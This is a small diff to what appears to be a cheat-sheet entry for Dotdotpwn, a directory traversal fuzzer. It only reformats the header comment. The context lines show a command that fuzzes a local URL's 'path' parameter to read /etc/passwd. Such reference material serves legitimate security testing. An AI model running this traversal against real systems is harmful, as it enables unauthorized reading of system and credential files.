@@ -1,6 +1,4 @@
-# Dotdotpwn
-# Directory traversal and fuzzer.
-
+# Dotdotpwn : Directory traversal and fuzzer.
 # Directory traversal for url http://127.0.0.1:65412/ at variable 'path' searching for /etc/passwd that contain the keyword 'root:'
 ./dotdotpwn.pl -m http-url -u 'http://127.0.0.1:65412/?path=TRAVERSAL' -o 'unix' -k 'root:'
 
